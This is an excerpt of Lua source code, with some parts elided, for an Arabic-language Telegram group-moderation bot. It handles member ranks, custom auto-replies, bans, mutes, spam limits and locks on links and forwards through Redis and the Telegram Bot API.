Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'L9L9L')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
end
...
if DevAbs:sismember(SURSBER.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrrio = DevAbs:get(SURSBER.."Comd:New:rt:Rio:"..text1[2]..msg.chat_id_)
if mrrio == "مميز" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'L9L9L')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:sadd(SURSBER..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevAbs:set(SURSBER.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'L9L9L')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:sadd(SURSBER..'Rio:Admins:'..msg.chat_id_, result.id_)
DevAbs:set(SURSBER.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'L9L9L')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:sadd(SURSBER..'Rio:Managers:'..msg.chat_id_, result.id_)
DevAbs:set(SURSBER.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'L9L9L')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
DevAbs:srem(SURSBER..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevAbs:del(SURSBER.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'L9L9L')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:srem(SURSBER..'Rio:Admins:'..msg.chat_id_, result.id_)
DevAbs:del(SURSBER.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'L9L9L')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:srem(SURSBER..'Rio:Managers:'..msg.chat_id_, result.id_)
DevAbs:del(SURSBER.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'L9L9L')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
DevAbs:incr(SURSBER..'Rio:UsersMsgs'..SURSBER..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:incr(SURSBER..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:incr(SURSBER..'Rio:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevAbs:sismember(SURSBER.."Rio:Users",msg.chat_id_) then
DevAbs:sadd(SURSBER.."Rio:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
...
if not DevAbs:get(SURSBER..'Rio:Start:Time'..msg.sender_user_id_) then
...
local start = DevAbs:get(SURSBER.."Rio:Start:Bot")
if start then 
Start_Source = start
else
...
DevAbs:setex(SURSBER..'Rio:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     Source SURSBER     --
if not SecondSudo(msg) and not DevAbs:sismember(SURSBER..'Rio:Ban:Pv',msg.sender_user_id_) and not DevAbs:get(SURSBER..'Rio:Texting:Pv') then
...
DevAbs:sadd(SURSBER..'Rio:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '᥀︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n᥀︙تم الغاء حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevAbs:srem(SURSBER..'Rio:Ban:Pv',data.id_)  
return false  
end 
...
--     Source SURSBER     --
if text and DevAbs:get(SURSBER..'Rio:Start:Bots'..msg.sender_user_id_) then
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الستارت', 1, 'md')
DevAbs:del(SURSBER..'Rio:Start:Bots'..msg.sender_user_id_) 
return false
end
DevAbs:set(SURSBER.."Rio:Start:Bot",text)  
...
DevAbs:set(SURSBER..'Rio:Start:Bots'..msg.sender_user_id_,true) 
...
DevAbs:del(SURSBER.."Rio:Lock:AutoFile")
end
...
DevAbs:set(SURSBER.."Rio:Lock:AutoFile",true) 
end
end
end
--     Source SURSBER     --
...
local my_ph = DevAbs:get(SURSBER.."Rio:Photo:Profile"..msg.chat_id_)
if not my_ph then
...
if not DevAbs:get(SURSBER..'Rio:Lock:Gamesinline'..msg.chat_id_) then
Text =[[
...
DevAbs:incr(SURSBER..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:set(SURSBER.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = DevAbs:get(SURSBER.."Rio:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
...
DevAbs:sadd(SURSBER..'Rio:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
...
DevAbs:srem(SURSBER.."Rio:Groups", msg.chat_id_) 
...
if DevAbs:get(SURSBER..'Rio:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
DevAbs:incr(SURSBER..'Rio:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
DevAbs:incr(SURSBER..'Rio:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
--     Source SURSBER     --
if text ==('تفعيل') and not SudoBot(msg) and ChCheck(msg) then
if not DevAbs:get(SURSBER..'Rio:Lock:FreeBot'..SURSBER) then
if ChatType == 'pv' then
...
DevAbs:sadd(SURSBER..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevAbs:srem(SURSBER..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevAbs:sadd(SURSBER..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
...
DevAbs:sadd(SURSBER.."Rio:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevAbs:sadd(SURSBER.."Rio:RioConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevAbs:srem(SURSBER.."Rio:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevAbs:srem(SURSBER.."Rio:RioConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevAbs:sismember(SURSBER..'Rio:Groups',msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙المجموعه بالتاكيد مفعله', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(DevAbs:get(SURSBER..'Rio:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙عدد اعضاء المجموعه اقل من ↫ *'..(DevAbs:get(SURSBER..'Rio:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","᥀︙تم تفعيل المجموعه "..dp.title_)  
DevAbs:sadd(SURSBER.."Rio:Groups",msg.chat_id_)
DevAbs:sadd(SURSBER..'Rio:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
...
DevAbs:set(SURSBER.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
...
DevAbs:set(SURSBER..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     Source SURSBER     --
local ReFalse = tostring(msg.chat_id_)
if not DevAbs:sismember(SURSBER.."Rio:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
...
if DevAbs:get(SURSBER..'Rio:Lock:Robot'..msg.chat_id_) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..dp.id_)
DevAbs:sadd(SURSBER..'Rio:Tkeed:'..msg.chat_id_, dp.id_)
...
if DevAbs:get(SURSBER.."Rio:Lock:Join"..msg.chat_id_) then
...
if not Bot(msg) then 
local filter = DevAbs:smembers(SURSBER.."Rio:FilterPhoto"..msg.chat_id_)
...
if not Bot(msg) then 
local filter = DevAbs:smembers(SURSBER.."Rio:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
...
if not Bot(msg) then 
local filter = DevAbs:smembers(SURSBER.."Rio:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
...
local DelGpRedRedods = DevAbs:get(SURSBER..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
local GetGpTexts = DevAbs:get(SURSBER..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedods == 'DelGpRedRedods' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الرد ↫ '..msg.content_.text_..' للكلمه ↫ '..GetGpTexts..' تم حذفها',  1, "html")
DevAbs:del(SURSBER..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevAbs:srem(SURSBER..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevAbs:get(SURSBER..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRedod' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevAbs:del(SURSBER..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
DevAbs:srem(SURSBER..'Rio:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevAbs:get(SURSBER..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRed' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevAbs:del(SURSBER..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbs:srem(SURSBER..'Rio:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelAllRed = DevAbs:get(SURSBER.."Rio:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevAbs:del(SURSBER.."Rio:Add:AllRed"..msg.sender_user_id_)
DevAbs:del(SURSBER.."Rio:Gif:AllRed"..msg.content_.text_)
DevAbs:del(SURSBER.."Rio:Voice:AllRed"..msg.content_.text_)
DevAbs:del(SURSBER.."Rio:Audio:AllRed"..msg.content_.text_)
DevAbs:del(SURSBER.."Rio:Photo:AllRed"..msg.content_.text_)
DevAbs:del(SURSBER.."Rio:Stecker:AllRed"..msg.content_.text_)
DevAbs:del(SURSBER.."Rio:Video:AllRed"..msg.content_.text_)
DevAbs:del(SURSBER.."Rio:File:AllRed"..msg.content_.text_)
DevAbs:del(SURSBER.."Rio:Text:AllRed"..msg.content_.text_)
DevAbs:del(SURSBER.."Rio:Sudo:AllRed",msg.content_.text_)
return false
end
end
--     Source SURSBER     --
if text and text:match("^(.*)$") then
local SaveGpRedod = DevAbs:get(SURSBER..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRedod == 'SaveGpRedod' then
local GetGpTexts = DevAbs:get(SURSBER..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevAbs:smembers(SURSBER..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙᥀︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
DevAbs:del(SURSBER..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
DevAbs:srem(SURSBER..'Rio:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevAbs:sadd(SURSBER..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
if #List == 4 then 
...
if text and not DevAbs:get(SURSBER..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
if DevAbs:sismember(SURSBER..'Rio:Manager:GpRedod'..msg.chat_id_,text) then
local SURSBERTeam =  DevAbs:smembers(SURSBER..'Rio:Text:GpTexts'..text..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '['..SURSBERTeam[math.random(#SURSBERTeam)]..']' , 1, 'md')  
end
end
--     Source SURSBER     --
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = DevAbs:get(SURSBER..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRed == 'SaveGpRed' then 
if text == 'الغاء' then
local DelManagerRep = DevAbs:get(SURSBER..'DelManagerRep'..msg.chat_id_)
DevAbs:srem(SURSBER..'Rio:Manager:GpRed'..msg.chat_id_,DelManagerRep)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ الرد', 1, 'md')
DevAbs:del(SURSBER..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevAbs:del(SURSBER..'DelManagerRep'..msg.chat_id_)
return false
end
DevAbs:del(SURSBER..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
local SaveGpRed = DevAbs:get(SURSBER..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
if msg.content_.video_ then DevAbs:set(SURSBER..'Rio:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevAbs:set(SURSBER..'Rio:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevAbs:set(SURSBER..'Rio:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevAbs:set(SURSBER..'Rio:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevAbs:set(SURSBER..'Rio:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
end
...
DevAbs:set(SURSBER..'Rio:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
end
if msg.content_.animation_ then DevAbs:set(SURSBER..'Rio:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevAbs:set(SURSBER..'Rio:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
end 
...
if msg.content_.text_ and not DevAbs:get(SURSBER..'Rio:Lock:GpRed'..msg.chat_id_) then 
if DevAbs:get(SURSBER..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(SURSBER..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevAbs:get(SURSBER..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(SURSBER..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevAbs:get(SURSBER..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(SURSBER..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevAbs:get(SURSBER..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(SURSBER..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevAbs:get(SURSBER..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(SURSBER..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevAbs:get(SURSBER..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(SURSBER..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevAbs:get(SURSBER..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(SURSBER..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
end
if DevAbs:get(SURSBER..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
function SURSBERTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevAbs:get(SURSBER..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevAbs:get(SURSBER..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevAbs:get(SURSBER..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_)
...
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = DevAbs:get(SURSBER.."Rio:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'الغاء' then
local DelSudoRep = DevAbs:get(SURSBER..'DelSudoRep')
DevAbs:del(SURSBER.."Rio:Sudo:AllRed",DelSudoRep)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ الرد', 1, 'md')
DevAbs:del(SURSBER.."Rio:Add:AllText"..msg.sender_user_id_)
DevAbs:del(SURSBER.."Rio:Add:AllRed"..msg.sender_user_id_)
DevAbs:del(SURSBER.."DelSudoRep")
return false
end
DevAbs:del(SURSBER.."Rio:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = DevAbs:get(SURSBER.."Rio:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
DevAbs:set(SURSBER.."Rio:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevAbs:set(SURSBER.."Rio:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
DevAbs:set(SURSBER.."Rio:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevAbs:set(SURSBER.."Rio:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevAbs:set(SURSBER.."Rio:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
...
DevAbs:set(SURSBER.."Rio:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
DevAbs:set(SURSBER.."Rio:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevAbs:set(SURSBER.."Rio:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الرد الجديد', 1, 'md') 
DevAbs:del(SURSBER.."Rio:Add:AllText"..msg.sender_user_id_)
DevAbs:del(SURSBER..'DelSudoRep')
return false end end
if msg.content_.text_ and not DevAbs:get(SURSBER..'Rio:Lock:AllRed'..msg.chat_id_) then
if DevAbs:get(SURSBER.."Rio:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(SURSBER.."Rio:Video:AllRed"..msg.content_.text_))
end
if DevAbs:get(SURSBER.."Rio:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(SURSBER.."Rio:File:AllRed"..msg.content_.text_))
end
if DevAbs:get(SURSBER.."Rio:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(SURSBER.."Rio:Voice:AllRed"..msg.content_.text_))
end
if DevAbs:get(SURSBER.."Rio:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(SURSBER.."Rio:Audio:AllRed"..msg.content_.text_))
end
if DevAbs:get(SURSBER.."Rio:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(SURSBER.."Rio:Photo:AllRed"..msg.content_.text_))
end
if  DevAbs:get(SURSBER.."Rio:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(SURSBER.."Rio:Gif:AllRed"..msg.content_.text_))
end
if DevAbs:get(SURSBER.."Rio:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(SURSBER.."Rio:Stecker:AllRed"..msg.content_.text_))
end
if DevAbs:get(SURSBER.."Rio:Text:AllRed"..msg.content_.text_) then
function SURSBERTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevAbs:get(SURSBER..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevAbs:get(SURSBER..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevAbs:get(SURSBER.."Rio:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
...
if Type == "keed" and not DevAbs:sismember(SURSBER..'Rio:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
...
if Type == "mute" and not DevAbs:sismember(SURSBER..'Rio:Muted:'..msg.chat_id_, msg.sender_user_id_) then
DevAbs:sadd(SURSBER..'Rio:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
...
--     Source SURSBER     --
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevAbs:hget(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= SURSBER then
floods = DevAbs:hget(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = DevAbs:hget(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = DevAbs:hget(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(DevAbs:get(SURSBER.."Rio:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(DevAbs:hget(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = DevAbs:hget(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
DevAbs:setex(SURSBER.."Rio:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevAbs:hget(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if DevAbs:hget(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = DevAbs:hget(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if DevAbs:hget(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = DevAbs:hget(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--     Source SURSBER     --
...
DevAbs:set(SURSBER..'Rio:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = DevAbs:get(SURSBER..'Rio:PinnedMsg'..msg.chat_id_)
if pin_id and DevAbs:get(SURSBER..'Rio:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if DevAbs:get(SURSBER..'Rio:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevAbs:del(SURSBER..'Rio:viewget'..msg.sender_user_id_)
else
...
if DevAbs:get(SURSBER..'Rio:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbs:get(SURSBER..'Rio:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbs:get(SURSBER..'Rio:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbs:get(SURSBER..'Rio:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(SURSBER..'Rio:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
